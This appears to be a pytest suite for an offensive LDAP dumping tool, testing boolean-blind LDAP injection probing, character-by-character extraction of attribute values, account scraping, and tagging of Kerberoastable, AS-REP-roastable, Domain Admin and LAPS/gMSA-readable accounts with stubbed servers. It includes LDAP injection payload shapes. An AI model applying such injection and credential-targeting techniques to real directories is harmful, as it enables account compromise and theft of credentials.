"""Unit tests for src/ldap_dump.py — vendor fingerprinting, UAC parsing,
account scraping, boolean-blind probe, and char-walker behavior.

Run:  python -m pytest tests/test_ldap_dump.py -v
"""
from __future__ import annotations

import asyncio
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

import ldap_dump  # noqa: E402


def _run(coro):
    """Run an async coroutine in a fresh event loop. Used in place of
    pytest-asyncio so this test suite has no extra plugin requirement."""
    return asyncio.run(coro)


# ── parse_uac ───────────────────────────────────────────────────────────────

def test_parse_uac_asreproastable():
    # 0x400200 = NORMAL_ACCOUNT (0x200) | DONT_REQ_PREAUTH (0x400000)
    flags = ldap_dump.parse_uac(0x400200)
    assert "NORMAL_ACCOUNT" in flags
    assert "DONT_REQ_PREAUTH" in flags
    assert "ACCOUNTDISABLE" not in flags


def test_parse_uac_disabled_no_expire():
    # 0x10002 = ACCOUNTDISABLE | DONT_EXPIRE_PASSWORD
    flags = ldap_dump.parse_uac(0x10002)
    assert "ACCOUNTDISABLE" in flags
    assert "DONT_EXPIRE_PASSWORD" in flags


def test_parse_uac_handles_strings():
    assert ldap_dump.parse_uac("514") == ldap_dump.parse_uac(514)


def test_parse_uac_empty_on_garbage():
    assert ldap_dump.parse_uac("not_an_int") == []
    assert ldap_dump.parse_uac(None) == []


def test_parse_uac_zero_returns_no_flags():
    assert ldap_dump.parse_uac(0) == []


# ── Vendor catalog ──────────────────────────────────────────────────────────

def test_vendors_include_ad_and_generic():
    names = [v.name for v in ldap_dump._VENDORS]
    assert "active_directory" in names
    assert "openldap" in names
    assert "generic_ldap" in names


def test_ad_high_value_attrs_include_kerberoasting_signals():
    ad = next(v for v in ldap_dump._VENDORS if v.name == "active_directory")
    assert "servicePrincipalName" in ad.high_value_attrs
    assert "userAccountControl" in ad.high_value_attrs
    assert "ms-Mcs-AdmPwd" in ad.high_value_attrs


def test_looks_ldap_detects_signatures():
    assert ldap_dump._looks_ldap("javax.naming.NamingException: bad search filter")
    assert ldap_dump._looks_ldap("LDAPException at line 12")
    assert ldap_dump._looks_ldap("ldap_sasl_bind failed")


def test_looks_ldap_rejects_unrelated():
    assert not ldap_dump._looks_ldap("mysql_fetch error")
    assert not ldap_dump._looks_ldap("")
    assert not ldap_dump._looks_ldap("404 Not Found")


# ── Account scraping ────────────────────────────────────────────────────────

def test_scrape_accounts_parses_ldif():
    body = (
        "dn: CN=Alice,OU=Users,DC=corp,DC=local\n"
        "cn: Alice\n"
        "sAMAccountName: alice\n"
        "mail: alice@corp.local\n"
        "\n"
        "dn: CN=Bob,OU=Users,DC=corp,DC=local\n"
        "cn: Bob\n"
        "sAMAccountName: bob\n"
    )
    dumper = ldap_dump.LDAPDumper(out_dir=".")
    accounts = dumper._scrape_accounts(
        body,
        ["sAMAccountName", "cn", "mail"],
    )
    assert len(accounts) == 2
    assert accounts[0].identifier == "alice"
    assert accounts[0].dn == "CN=Alice,OU=Users,DC=corp,DC=local"
    assert accounts[0].attributes["sAMAccountName"] == "alice"
    assert accounts[1].identifier == "bob"


def test_scrape_accounts_parses_json_shape():
    body = (
        '{"sAMAccountName":"carol","mail":"carol@corp.local","displayName":"Carol"}'
    )
    dumper = ldap_dump.LDAPDumper(out_dir=".")
    accounts = dumper._scrape_accounts(
        body,
        ["sAMAccountName", "mail", "displayName"],
    )
    assert len(accounts) == 1
    assert accounts[0].identifier == "carol"
    assert accounts[0].attributes["mail"] == "carol@corp.local"


def test_scrape_accounts_empty_body_returns_empty():
    dumper = ldap_dump.LDAPDumper(out_dir=".")
    assert dumper._scrape_accounts("", ["cn"]) == []


# ── Boolean-blind char-walker (stubbed httpx) ───────────────────────────────

class _StubClient:
    """Stub httpx.AsyncClient.get → returns a controllable response."""

    def __init__(self, responder):
        self._responder = responder
        self.calls: list[str] = []

    async def get(self, url):
        self.calls.append(url)
        body = self._responder(url)
        return _StubResponse(body)


class _StubResponse:
    def __init__(self, body: str):
        self.text = body
        self.status_code = 200


def test_char_walk_extracts_known_prefix():
    """Stubbed server: returns a 'true-class' (long) response only when the
    char-walk prefix is a prefix of the secret 'admin'. Otherwise 'false-class'."""
    secret = "admin"

    def responder(url: str) -> str:
        from urllib.parse import urlparse, parse_qs
        qs = parse_qs(urlparse(url).query)
        v = qs.get("user", [""])[0]
        import re
        # Payload shape: "*)(<attr>=<prefix>*)(&(1=1" or "*)(<attr>=<prefix>)(&(1=1"
        m = re.search(r"\)\(sAMAccountName=([^)*]*)(\*?)\)", v)
        if not m:
            return "FALSE" * 5
        prefix = m.group(1).lower()
        has_wildcard = bool(m.group(2))
        if not prefix:
            return "TRUE" * 100
        if has_wildcard:
            return "TRUE" * 100 if secret.startswith(prefix) else "FALSE" * 5
        return "TRUE" * 100 if secret == prefix else "FALSE" * 5

    confirmed = ldap_dump.InjectionConfirmed(
        endpoint="https://target/login?user=x",
        param="user",
        baseline_len=400,
        true_len=400,
        false_len=25,
        wildcard_len=400,
    )
    dumper = ldap_dump.LDAPDumper(out_dir=".")
    extracted = _run(dumper._char_walk(
        _StubClient(responder), confirmed, "sAMAccountName",
    ))
    assert extracted, f"walker returned empty (expected prefix of {secret!r})"
    assert secret.startswith(extracted) or extracted == secret


def test_probe_boolean_no_split_returns_none():
    """When true/false responses are nearly identical, no confirmation."""

    def responder(url: str) -> str:
        return "same response always" * 100  # identical lengths

    dumper = ldap_dump.LDAPDumper(out_dir=".")
    result = _run(dumper._probe_boolean(
        _StubClient(responder),
        "https://target/login?user=x",
        "user",
    ))
    assert result is None


def test_probe_boolean_confirms_when_split_present():
    """True-payload returns long body; false-payload returns short."""

    def responder(url: str) -> str:
        from urllib.parse import urlparse, parse_qs
        v = parse_qs(urlparse(url).query).get("user", [""])[0]
        if "1=1" in v and "zzzNoSuch" not in v:
            return "LONG" * 200    # true-class
        if "zzzNoSuch" in v:
            return "S"             # false-class (tiny)
        if v == "*":
            return "LONG" * 200    # wildcard matches true-class
        return "BASELINE" * 50     # baseline

    dumper = ldap_dump.LDAPDumper(out_dir=".")
    result = _run(dumper._probe_boolean(
        _StubClient(responder),
        "https://target/login?user=x",
        "user",
    ))
    assert result is not None
    assert result.true_len > result.false_len
    assert result.endpoint == "https://target/login?user=x"
    assert result.param == "user"


# ── High-value tagging ──────────────────────────────────────────────────────

def test_tag_high_value_kerberoastable():
    vendor = next(v for v in ldap_dump._VENDORS if v.name == "active_directory")
    result = ldap_dump.LDAPDumpResult(out_dir="t")
    result.accounts.append(ldap_dump.LDAPAccount(
        identifier="svc_web",
        dn="CN=svc_web,OU=Service,DC=corp,DC=local",
        attributes={
            "sAMAccountName": "svc_web",
            "servicePrincipalName": "HTTP/web.corp.local",
            "userAccountControl": "512",  # NORMAL_ACCOUNT only — not a computer
        },
    ))
    ldap_dump.LDAPDumper._tag_high_value(result, vendor)
    assert "KERBEROASTABLE" in result.accounts[0].tags


def test_tag_high_value_asreproastable_and_disabled():
    vendor = next(v for v in ldap_dump._VENDORS if v.name == "active_directory")
    result = ldap_dump.LDAPDumpResult(out_dir="t")
    result.accounts.append(ldap_dump.LDAPAccount(
        identifier="old_user",
        attributes={
            # 0x400000 (DONT_REQ_PREAUTH) | 0x2 (ACCOUNTDISABLE) | 0x200 (NORMAL_ACCOUNT)
            "userAccountControl": str(0x400202),
        },
    ))
    ldap_dump.LDAPDumper._tag_high_value(result, vendor)
    tags = result.accounts[0].tags
    assert "ASREPROASTABLE" in tags
    assert "DISABLED" in tags


def test_tag_high_value_domain_admin_via_memberof():
    vendor = next(v for v in ldap_dump._VENDORS if v.name == "active_directory")
    result = ldap_dump.LDAPDumpResult(out_dir="t")
    result.accounts.append(ldap_dump.LDAPAccount(
        identifier="boss",
        attributes={
            "memberOf": "CN=Domain Admins,CN=Users,DC=corp,DC=local",
            "userAccountControl": "512",
        },
    ))
    ldap_dump.LDAPDumper._tag_high_value(result, vendor)
    assert "DOMAIN_ADMIN" in result.accounts[0].tags


def test_tag_high_value_laps_and_gmsa():
    vendor = next(v for v in ldap_dump._VENDORS if v.name == "active_directory")
    result = ldap_dump.LDAPDumpResult(out_dir="t")
    result.accounts.append(ldap_dump.LDAPAccount(
        identifier="DC01",
        attributes={
            "ms-Mcs-AdmPwd": "ExposedLAPS!2026",
            "msDS-ManagedPassword": "0x...",
            "userAccountControl": "532480",  # 0x82000 incl. SERVER_TRUST_ACCOUNT
        },
    ))
    ldap_dump.LDAPDumper._tag_high_value(result, vendor)
    tags = result.accounts[0].tags
    assert "LAPS_READABLE" in tags
    assert "GMSA_READABLE" in tags


def test_tag_high_value_generic_password_exposed():
    vendor = next(v for v in ldap_dump._VENDORS if v.name == "openldap")
    result = ldap_dump.LDAPDumpResult(out_dir="t")
    result.accounts.append(ldap_dump.LDAPAccount(
        identifier="alice",
        attributes={"userPassword": "{SSHA}abc123"},
    ))
    ldap_dump.LDAPDumper._tag_high_value(result, vendor)
    assert "PASSWORD_HASH_EXPOSED" in result.accounts[0].tags


# ── to_dict round-trip ──────────────────────────────────────────────────────

def test_result_to_dict_serializes_all_fields():
    result = ldap_dump.LDAPDumpResult(
        fingerprints=[ldap_dump.VendorFingerprint(
            vendor="active_directory", confidence=0.9, evidence="x")],
        confirmed_injections=[ldap_dump.InjectionConfirmed(
            endpoint="https://t/login", param="user",
            baseline_len=100, true_len=500, false_len=20, wildcard_len=500)],
        accounts=[ldap_dump.LDAPAccount(
            identifier="alice", attributes={"cn": "Alice"}, tags=["KERBEROASTABLE"])],
        out_dir="t",
    )
    d = result.to_dict()
    assert d["fingerprints"][0]["vendor"] == "active_directory"
    assert d["confirmed_injections"][0]["param"] == "user"
    assert d["accounts"][0]["tags"] == ["KERBEROASTABLE"]
